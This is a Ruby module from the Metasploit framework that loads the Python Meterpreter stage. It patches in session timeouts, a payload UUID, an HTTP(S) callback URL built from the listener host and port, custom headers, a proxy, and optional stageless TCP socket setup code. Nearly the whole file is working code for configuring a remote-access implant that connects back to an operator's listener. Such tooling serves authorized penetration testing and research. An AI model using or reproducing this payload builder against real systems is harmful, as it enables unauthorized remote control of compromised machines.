# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/base/sessions/meterpreter_options'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Common module stub for ARCH_PYTHON payloads that make use of Meterpreter.
#
###

module Payload::Python::MeterpreterLoader

  include Msf::Payload::Python
  include Msf::Payload::UUID::Options
  include Msf::Payload::TransportConfig
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration',
      'Description'   => 'Run Meterpreter & the configuration stub',
      'Author'        => [ 'Spencer McIntyre' ],
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Stager'        => {'Payload' => ""}
    ))

    register_advanced_options(
      [
        OptBool.new(
          'MeterpreterTryToFork',
          'Fork a new process if the functionality is available',
          default: true
        ),
        OptBool.new(
          'PythonMeterpreterDebug',
          'Enable debugging for the Python meterpreter'
        ),
      ] +
      Msf::Opt::http_header_options
    )
  end

  def stage_payload(opts={})
    stage_meterpreter(opts)
  end

  # Get the raw Python Meterpreter stage and patch in values based on the
  # configuration
  #
  # @param opts [Hash] The options to use for patching the stage data.
  # @option opts [String] :http_proxy_host The host to use as a proxy for
  #   HTTP(S) transports.
  # @option opts [String] :http_proxy_port The port to use when a proxy  host is
  #   set for HTTP(S) transports.
  # @option opts [String] :url The HTTP(S) URL to patch in to
  #   allow use of the stage as a stageless payload.
  # @option opts [String] :http_user_agent The value to use for the User-Agent
  #   header for HTTP(S) transports.
  # @option opts [String] :stageless_tcp_socket_setup Python code to execute to
  #   setup a tcp socket to allow use of the stage as a stageless payload.
  # @option opts [String] :uuid A specific UUID to use for sessions created by
  #   this stage.
  def stage_meterpreter(opts={})
    ds = opts[:datastore] || datastore
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.py')

    var_escape = lambda { |txt|
      txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
    }

    unless ds['MeterpreterTryToFork']
      met.sub!('TRY_TO_FORK = True', 'TRY_TO_FORK = False')
    end
    if ds['PythonMeterpreterDebug']
      met.sub!('DEBUGGING = False', 'DEBUGGING = True')
    end

    met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{ds['SessionExpirationTimeout']}")
    met.sub!('SESSION_COMMUNICATION_TIMEOUT = 300', "SESSION_COMMUNICATION_TIMEOUT = #{ds['SessionCommunicationTimeout']}")
    met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{ds['SessionRetryTotal']}")
    met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{ds['SessionRetryWait']}")

    uuid = opts[:uuid] || generate_payload_uuid
    uuid = Rex::Text.to_hex(uuid.to_raw, prefix = '')
    met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")

    if opts[:stageless] == true
      session_guid = '00' * 16
    else
      session_guid = SecureRandom.uuid.gsub(/-/, '')
    end
    met.sub!("SESSION_GUID = \'\'", "SESSION_GUID = \'#{session_guid}\'")

    http_user_agent = opts[:http_user_agent] || ds['HttpUserAgent']
    http_proxy_host = opts[:http_proxy_host] || ds['HttpProxyHost'] || ds['PROXYHOST']
    http_proxy_port = opts[:http_proxy_port] || ds['HttpProxyPort'] || ds['PROXYPORT']
    http_header_host = opts[:header_host] || ds['HttpHostHeader']
    http_header_cookie = opts[:header_cookie] || ds['HttpCookie']
    http_header_referer = opts[:header_referer] || ds['HttpReferer']

    # The callback URL can be different to the one that we're receiving from the interface
    # so we need to generate it
    # TODO: move this to somewhere more common so that it can be used across payload types
    unless opts[:url].to_s == ''

      # Build the callback URL (TODO: share this logic with TransportConfig
      uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
      opts[:scheme] ||= opts[:url].to_s.split(':')[0]
      scheme, lhost, lport = transport_uri_components(opts)
      callback_url = "#{scheme}://#{lhost}:#{lport}#{ds['LURI']}#{uri}/"

      # patch in the various payload related configuration
      met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(callback_url)}'")
      met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(http_user_agent)}'") if http_user_agent.to_s != ''
      met.sub!('HTTP_COOKIE = None', "HTTP_COOKIE = '#{var_escape.call(http_header_cookie)}'") if http_header_cookie.to_s != ''
      met.sub!('HTTP_HOST = None', "HTTP_HOST = '#{var_escape.call(http_header_host)}'") if http_header_host.to_s != ''
      met.sub!('HTTP_REFERER = None', "HTTP_REFERER = '#{var_escape.call(http_header_referer)}'") if http_header_referer.to_s != ''

      if http_proxy_host.to_s != ''
        proxy_url = "http://#{http_proxy_host}:#{http_proxy_port}"
        met.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
      end
    end

    # patch in any optional stageless tcp socket setup
    unless opts[:stageless_tcp_socket_setup].nil?
      offset_string = ""
      /(?<offset_string>\s+)# PATCH-SETUP-STAGELESS-TCP-SOCKET #/ =~ met
      socket_setup = opts[:stageless_tcp_socket_setup]
      socket_setup = socket_setup.split("\n")
      socket_setup.map! {|line| "#{offset_string}#{line}\n"}
      socket_setup = socket_setup.join
      met.sub!("#{offset_string}# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
    end

    met
  end

end

end
